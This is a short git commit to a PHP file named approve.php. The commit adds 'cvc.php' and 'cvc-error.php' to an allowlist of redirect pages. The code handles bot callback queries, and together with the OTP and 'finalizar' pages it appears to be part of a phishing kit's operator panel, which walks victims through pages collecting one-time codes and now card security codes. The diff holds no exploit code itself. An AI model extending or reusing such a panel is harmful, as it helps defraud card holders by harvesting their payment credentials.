952a14ddfe226861f018baeda06a7dadd46f5606
GOD-HYDRA <78251014+GODHYDRA666@users.noreply.github.com>
2026-09-13 19:26:04 -0500

    Update approve.php

--- approve.php
+++ approve.php
@@ -39,7 +39,7 @@ if (isset($update['callback_query'])) {
 
             $valid_pages = [
                 'index.php', 'index-error.php', 'otp.php',
-                'otp-error.php', 'finalizar.php'
+                'otp-error.php', 'cvc.php', 'cvc-error.php', 'finalizar.php'
             ];
 
             if (!in_array($redirect_page, $valid_pages)) {
